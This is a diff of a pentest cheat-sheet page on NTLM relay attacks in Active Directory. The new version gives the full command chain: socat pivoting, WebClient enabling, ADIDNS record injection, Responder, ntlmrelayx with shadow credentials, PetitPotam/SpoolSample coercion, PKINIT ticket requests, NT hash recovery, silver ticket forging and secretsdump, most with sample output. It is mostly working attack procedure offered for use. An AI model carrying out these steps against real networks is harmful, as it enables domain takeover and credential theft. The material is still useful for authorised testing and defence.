@@ -1,12 +1,11 @@
 ---
 title: "NTLM Relay Attack"
-date: 2025-7-25
-tags: ["Shadow Credentials", "Attack Chain", "Ntlm", "Ldap", "Pass-The-Hash", "Impacket", "Ntlmreplay", "Petitpotam", "Active Directory", "Windows", "ADCS", "Webdav", "Pkinit", "Ticket Granting Ticket"]
+tags: ["Shadow Credential", "NTLM", "LDAP", "Pass-The-Hash", "Impacket", "NTLM Replay", "Petitpotam", "Active Directory", "Windows", "ADCS", "WebDAV", "Pkinit", "Ticket Granting Ticket"]
 ---
 
-### Abuse #1: Add Shadow Credential
+### Abuse #1: Shadow Credential
 
-#### 1. Run socat to Redirect Traffic (Inside Pivoting Node)
+#### 1. Redirect Traffic (Pivoting Node) \[Optional\]
 
 ```console
 # Upload socat.zip and unzip
@@ -29,92 +28,87 @@ the public mailing list cygwin@cygwin.com
 
 <small>*Ref: [socat](https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master)*</small>
 
-#### 2. Enable Webdav (Inside Windows Target) \[Optional\]
+#### 2. Enable WebClient Service (Windows Target) \[Optional\]
 
 ```console
-$Source = @"
-using System;
-using System.Text;
-using System.Security;
-using System.Collections.Generic;
-using System.Runtime.Versioning;
-using Microsoft.Win32.SafeHandles;
-using System.Runtime.InteropServices;
-using System.Diagnostics.CodeAnalysis;
+# Local Linux
+sudo responder -I tun0
+```
 
-namespace JosL.WebClient{
-	public static class Starter{
-		[StructLayout(LayoutKind.Explicit, Size=16)]
-		public class EVENT_DESCRIPTOR{
-			[FieldOffset(0)]ushort Id = 1;
-			[FieldOffset(2)]byte Version = 0;
-			[FieldOffset(3)]byte Channel = 0;
-			[FieldOffset(4)]byte Level = 4;
-			[FieldOffset(5)]byte Opcode = 0;
-			[FieldOffset(6)]ushort Task = 0;
-			[FieldOffset(8)]long Keyword = 0;
-		}
- 
-		[StructLayout(LayoutKind.Explicit, Size = 16)]
-		public struct EventData{
-			[FieldOffset(0)]
-			internal UInt64 DataPointer;
-			[FieldOffset(8)]
-			internal uint Size;
-			[FieldOffset(12)]
-			internal int Reserved;
-		}
- 
-		public static void startService(){
-			Guid webClientTrigger = new Guid(0x22B6D684, 0xFA63, 0x4578, 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7);
- 
-			long handle = 0;
-			uint output = EventRegister(ref webClientTrigger, IntPtr.Zero, IntPtr.Zero, ref handle);
- 
-			bool success = false;
- 
-			if (output == 0){
-				EVENT_DESCRIPTOR desc = new EVENT_DESCRIPTOR();
-				unsafe
-				{
-					uint writeOutput = EventWrite(handle, ref desc, 0, null);
-					success = writeOutput == 0;
-					EventUnregister(handle);
-				}
-			}
-		}
- 
-		[DllImport("Advapi32.dll", SetLastError = true)]
-		public static extern uint EventRegister(ref Guid guid, [Optional] IntPtr EnableCallback, [Optional] IntPtr CallbackContext, [In][Out] ref long RegHandle);
- 
-		[DllImport("Advapi32.dll", SetLastError = true)]
-		public static extern unsafe uint EventWrite(long RegHandle, ref EVENT_DESCRIPTOR EventDescriptor, uint UserDataCount, EventData* UserData);
- 
-		[DllImport("Advapi32.dll", SetLastError = true)]
-		public static extern uint EventUnregister(long RegHandle);
-	}
-}
-"@
+```console
+# Windows target
+net use x: http://<LOCAL_IP>/
+```
 
-$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
-$compilerParameters.CompilerOptions="/unsafe"
-Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $compilerParameters
-[JosL.WebClient.Starter]::startService()
+```console
+# Check
+./GetWebDAVStatus.exe <TARGET_DOMAIN>
+```
+
+```console {class="sample-code"}
+./GetWebDAVStatus.exe 10.10.254.230
+[+] WebClient service is active on 10.10.254.230
+```
+
+<small>*Ref: [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus)*</small>
+
+#### 3. Add a DNS Entry in Trusted Zone
+
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+```console
+python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r <SUBDOMAIN>.<DOMAIN> -d <LOCAL_IP> --action add <DC_IP>
+```
+
+```console {class="sample-code"}
+$ python dnstool.py -u 'example.com\apple.seed' -p 'P@ssw0rd123' -r test.example.com -d 10.8.7.13 --action add 10.10.143.101    
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
+```console
+# Import module
+. ./Powermad.ps1
+```
+
+```console
+# Add new entry
+New-ADIDNSNode -Tombstone -Verbose -Node * -Data <LOCAL_IP>
+```
+
+{{< /tabcontent >}}
+
+#### 4. Start Responder Listener (Local Linux)
+
+```console
+# Modify /etc/responder/Responder.conf
+; Servers to start
+SMB      = Off
+HTTP     = Off
+HTTPS    = Off
+LDAP     = Off
 ```
 
 <br>
 
 ```console
-# Run enable_webdav.ps1
-C:\xampp\htdocs\enable_webdav.ps1
+sudo responder -I tun0 -w -d -v
 ```
 
-#### 3. Start ntlmrelayx Listener (In Local Linux)
+#### 5. Start NTLM Relay Server (Local Linux)
 
-#### Get impacket fork : Add Shadow Credentials Commands to Ntlmrelayx's Interactive LDAP Shell
+#### Get Latest Impacket
 
 ```console
-git clone -b interactive-ldap-shadow-creds https://github.com/Tw1sm/impacket.git
+git clone https://github.com/fortra/impacket.git
 ```
 
 ```console
@@ -122,19 +116,15 @@ cd impacket
 ```
 
 ```console
-git checkout -b remotes/origin/interactive-ldap-shadow-creds
+python3 -m venv venv
 ```
 
 ```console
-python3 -m venv test
+source venv/bin/activate
 ```
 
 ```console
-source test/bin/activate
-```
-
-```console
-pip install .
+pip3 install .
 ```
 
 ```console
@@ -144,38 +134,43 @@ pip3 install impacket pyOpenSSL==24.0.0
 #### Run ntlmrelayx
 
 ```console
-ntlmrelayx.py -t ldaps://<DC> --delegate-access -i
+python3 examples/ntlmrelayx.py -t ldaps://<DC_IP> -smb2support --adcs --shadow-credentials --shadow-target '<TARGET_HOSTNAME>$' 
 ```
 
 ```console {class="sample-code"}
-$ ntlmrelayx.py -t ldaps://192.168.100.100 --delegate-access -i
+$ python3 examples/ntlmrelayx.py -t ldaps://10.10.254.229 -smb2support --adcs --shadow-credentials --shadow-target 'ws01$'
+Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its affiliated companies 
 
-Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corporation
-
-[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client SMB loaded..
 [*] Protocol Client HTTP loaded..
 [*] Protocol Client HTTPS loaded..
-[*] Protocol Client IMAP loaded..
 [*] Protocol Client IMAPS loaded..
-[*] Protocol Client LDAPS loaded..
-[*] Protocol Client LDAP loaded..
+[*] Protocol Client IMAP loaded..
 [*] Protocol Client MSSQL loaded..
 [*] Protocol Client RPC loaded..
-[*] Protocol Client SMB loaded..
-[*] Protocol Client SMTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
 [*] Running in relay mode to single host
-[*] Setting up SMB Server
+[*] Setting up SMB Server on port 445
 [*] Setting up HTTP Server on port 80
-[*] Setting up WCF Server
+[*] Setting up WCF Server on port 9389
 [*] Setting up RAW Server on port 6666
+[*] Setting up RPC Server on port 135
+[*] Multirelay disabled
 
 [*] Servers started, waiting for connections
 ```
 
-#### 4. Run PetitPotam (In Local Linux)
+#### 6. Coerce Authentication
+
+{{< tab set2 tab1 >}}Linux{{< /tab >}}
+{{< tab set2 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
 
 ```console
-python3 PetitPotam.py -u '<USER>@<DOMAIN>' -hashes :<HASH> <SOCAT_HOSTNAME>@8090/test <SOCAT_LISTENER_IP> -pipe all
+python3 PetitPotam.py -u '<USER>@<DOMAIN>' -hashes :<HASH> <RESPONDER_MACHINE_NAME>@80/test <LOCAL_IP> -pipe all
 ```
 
 ```console {class="sample-code"}
@@ -215,40 +210,20 @@ Trying pipe lsarpc
 
 <small>*Ref: [PetitPotam](https://github.com/topotam/PetitPotam)*</small>
 
-#### 5. Connect to LDAP Shell (In Local Linux)
+{{< /tabcontent >}}
+{{< tabcontent set2 tab2 >}}
 
 ```console
-rlwrap nc 127.0.0.1 11000
+./SpoolSample.exe <TARGET_DOMAIN> <RESPONDER_MACHINE_NAME>@80/test
 ```
 
-```console {class="sample-code"}
-$ rlwrap nc 127.0.0.1 11000
-Type help for list of commands
+{{< /tabcontent >}}
 
-# 
-```
+#### 7. Request TGT Using pfx File (Local Linux)
 
 ```console
-clear_shadow_creds <TARGET_HOSTNAME>$
-```
-
-```console {class="sample-code"}
-# clear_shadow_creds ms01$
-Found Target DN: CN=MS01,CN=Computers,DC=example,DC=com
-Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108
-
-Shadow credentials cleared successfully!
-```
-
-```console
-# Take Note of pfx path and password
-set_shadow_creds <TARGET_HOSTNAME>$
-```
-
-#### 6. Request a TGT Using pfx File (In Local Linux)
-
-```console
-python3 gettgtpkinit.py '<DOMAIN>/<TARGET_HOSTNAME>$' <TARGET_HOSTNAME>.ccache -cert-pfx <RANDOM_CHARS>.pfx -pfx-pass <RANDOM_CHARS_PASSWORD> -dc-ip <DC_IP>
+# Request a TGT
+python3 gettgtpkinit.py '<DOMAIN>/<TARGET_HOSTNAME>$' <TARGET_HOSTNAME>.ccache -cert-pfx <RANDOM_CHARS>.pfx -pfx-pass <RANDOM_PASSWORD> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
@@ -265,9 +240,19 @@ INFO:minikerberos:7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec
 INFO:minikerberos:Saved TGT to file
 ```
 
+```console
+# Check
+nxc smb <DC> --use-kcache
+```
+
 <small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>
 
-#### 7. Get NT Hash (In Local Linux)
+#### 8. Get NTLM Hash (Local Linux)
+
+```console
+# Import ticket
+export KRB5CCNAME='<TARGET_HOSTNAME>.ccache'
+```
 
 ```console
 python3 getnthash.py '<DOMAIN>/<TARGET_HOSTNAME>$' -key <AS_REP_ENC_KEY>
@@ -283,13 +268,29 @@ Recovered NT Hash
 59920e994636168744039017dcf49e54
 ```
 
-<br>
+#### 9. Get Silver Ticket
+
+```console
+impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC_IP> -spn anything/<TARGET_DOMAIN> administrator
+```
+
+#### 10. Secrets Dump
+
+```console
+# Import ticket
+export KRB5CCNAME='administrator.ccache'
+```
+
+```console
+# Secrets dump
+impacket-secretsdump -k -no-pass <TARGET_DOMAIN>
+```
 
 ---
 
 ### Abuse #2: Abusing Active Directory Certificate Services
 
-#### 1. Run socat to Redirect Traffic (Inside Pivoting Node)
+#### 1. Run socat to Redirect Traffic (Inside Pivoting Node) \[Optional\]
 
 ```console
 ./socat tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80 &
